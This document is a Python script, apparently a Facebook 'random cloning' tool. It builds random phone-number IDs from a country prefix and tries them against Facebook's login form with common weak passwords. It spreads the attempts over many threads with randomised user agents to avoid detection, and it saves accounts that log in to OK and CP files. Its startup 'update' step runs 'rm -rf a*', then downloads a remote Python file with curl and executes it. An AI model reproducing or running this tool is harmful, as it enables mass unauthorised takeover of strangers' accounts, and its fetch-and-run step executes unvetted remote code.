#coding=utf
import uuid
import os,sys,time,json,random,re,string,platform,base64
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python run.py')
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)

ugen2=[]
ugen=[]

for xd in range(25000):
    aa='Mozilla/5.0 (Windows NT 10.0; Win64;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0; Win64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/109.0.0.0 Safari/537.36 Edg/108.0.1462.76'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

    #Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
    aa='Mozilla/5.0 (Windows NT 10.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/109.0.0.0 Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    #Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
    aa='Mozilla/5.0 (Windows NT 10.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0; WOW64; Trident/7.0; rv:11.0'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='like Gecko'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    #Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/108.0.1462.76
    aa='Mozilla/5.0 (Windows NT 10.0; Win64; x64;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0; Win64; x64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/109.0.0.0 Safari/537.36 Edg/108.0.1462.76'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    #Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Vivaldi/5.6.2867.50
    aa='Mozilla/5.0 (Windows NT 10.0; Win64; x64;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0; Win64; x64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/109.0.0.0 Safari/537.36 Vivaldi/5.6.2867.50'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

logo=("""
   ▄█    █▄     ▄█  ███▄▄▄▄      ▄████████ 
  ███    ███   ███  ███▀▀▀██▄   ███    ███ 
  ███    ███   ███▌ ███   ███   ███    ███ 
 ▄███▄▄▄▄███▄▄ ███▌ ███   ███   ███    ███ 
▀▀███▀▀▀▀███▀  ███▌ ███   ███ ▀███████████ 
  ███    ███   ███  ███   ███   ███    ███ 
  ███    ███   ███  ███   ███   ███    ███ 
  ███    █▀    █▀    ▀█   █▀    ███    █▀  
                                            
\33[1;37m----------------------------------------------
→   Owner      :  HINA Rehman
→   Facebook   :  Hina Rehman
→   Github     :  mkbrand014 
→   Tool Type  :  FREE
\x1b[1;97m→   Version    : 0.1
\33[1;37m----------------------------------------------""")

def lines():
	print('\33[1;37m----------------------------------------------')
loop = 0
oks = []
cps = []
try:
    print('\n Updating...\n\033[1;37m Please Wait\033[0;97m\n Update don ')
    proxy = requests.get('https://raw.githubusercontent.com/ALI-JUTT/Ahmed/main/update.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/ALI-JUTT/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://raw.githubusercontent.com/ALI-JUTT/ali/main/ali.py > ali.py')
        os.system('python ali.py')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')

#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

def usman():
	os.system('clear')
	print(logo)
	print('[1] Pak Random Cloning menu')
	print('[2] Bangladish Random Cloning')
	print('[3] Contact with Admin ')
	print('[4] Join Facebook Group')
	print('\x1b[1;91m[5] Exit Main menu')
	print('\33[1;37m----------------------------------------------')
	usman1 = input('[•] Select option  : ')
	if usman1 =='1':
		os.system('xdg-open https://facebook.com/groups/1247732665816889/')
		annu()
	if usman1 =='5':
		usman()
	if usman1 =='3':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100014484078460')
	if usman1 =='4':
		os.system('xdg-open https://facebook.com/groups/1247732665816889/');usman()
	if usman1 =='2':
		bangla()
	else:
		print('\n\033[1;31mChoose valid option\033[0;97m')
		usman()

def annu():
    os.system('clear')
    print(logo)
    print('[1] Random Method \x1b[1;92m1')
    print('\x1b[1;97m[2] Random Method \x1b[1;92m2')
    print('\x1b[1;97m[3] Random Method \x1b[1;92m3')
    print('\x1b[1;91m[4] Go to main menu')
    lines()
    usman1 = input('[+] CHOOSE optION : ')
    if usman1 =='1':
    	m1()
    if usman1 =='2':
    	m2()
    if usman1 =='3':
    	m3()
    if usman1 =='4':
    	usman()
    else:
        print('\n\033[1;37m[+] SELECT VALID optION\033[0;97m')        
#
def bangla():
	os.system('clear')
	print(logo)
	print('[1] Bngla Crack \x1b[1;92mM 1')
	print('\x1b[1;97m[1] Bngla Crack \x1b[1;92mM 1')
	print('\x1b[1;91m[3] Go to main menu')
	lines()
	usman1 = input('[+] Select option : ')
	if usman1 =='1':
		b1()
	if usman1 =='2':
		b2()
	if usman1 =='3':
		usman()
#def choice()
#

def m1():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] Example  : 92345,92318,92334,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,5000,100000,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
    lines()
    limit = int(input('[+] Idz Lemit : '))
    print(46*'-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' Total Acounts : '+tl)
        print(' Selected Code :\x1b[1;92m '+kode)
        print('\x1b[1;91m If you no result use flight mode')
        lines()
        for guru in user:
            uid = kode+guru
            pwx=[guru,kode+guru]
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');usman()
#
def m2():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] Example  : 92345,92318,92334,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,5000,100000,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
    lines()
    limit = int(input('[+] Idz Lemit : '))
    print(46*'-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' Total Acounts : '+tl)
        print(' Selected Code :\x1b[1;92m '+kode)
        print('\x1b[1;91m If you no result use flight mode')
        lines()
        for guru in user:
            uid = kode+guru
            pwx=[guru,'khankhan','khan12345','khan12','khan786']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');usman()
#
def m3():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] Example  : 92345,92318,92334,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,5000,100000,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
    lines()
    limit = int(input('[+] Idz Lemit : '))
    print(46*'-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=40) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' Total Acounts : '+tl)
        print(' Selected Code :\x1b[1;92m '+kode)
        print('\x1b[1;91m If you no result use flight mode')
        lines()
        for guru in user:
            uid = kode+guru
            pwx=[guru,'khan786','khan1122','khan12','janjan']
            yaari.submit(rcrack,uid,pwx,tl)

    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');usman()
#
#
def b1():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] Example  : 88**,88***,88***,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,5000,100000,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
    lines()
    limit = int(input('[+] Idz Lemit : '))
    print(46*'-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' Total Acounts : '+tl)
        print(' Selected Code :\x1b[1;92m '+kode)
        print('\x1b[1;91m If you no result use flight mode')
        lines()
        for guru in user:
            uid = kode+guru
            pwx=[guru,kode]
            yaari.submit(rcrack,uid,pwx,tl)
 
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');usman()
#
def b2():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] Example  : 88***,88***,88***,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,5000,100000,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
    lines()
    limit = int(input('[+] Idz Lemit : '))
    print(46*'-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' Total Acounts : '+tl)
        print(' Selected Code :\x1b[1;92m '+kode)
        print('\x1b[1;91m If you no result use flight mode')
        lines()
        for guru in user:
            uid = kode+guru
            pwx=[guru,'freefire','bangladish','free fire']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');usman()

#
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = { 'authority': 'mbasic.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-US,en;q=0.9,it;q=0.8',
            'cache-control': 'max-age=0',
            'referer': 'https://www.google.com/',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com//login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[151:166]
                print('\033[1;32m[HINA-XD -OK] '+uid+'|'+ps+'\033[0;97m')
                open('HINA-XD -OK.txt', 'a').write(uid+' | '+ps+ '\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[HINA-XD -CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('HINA-XD -CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mHINA-XD \033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass

usman()
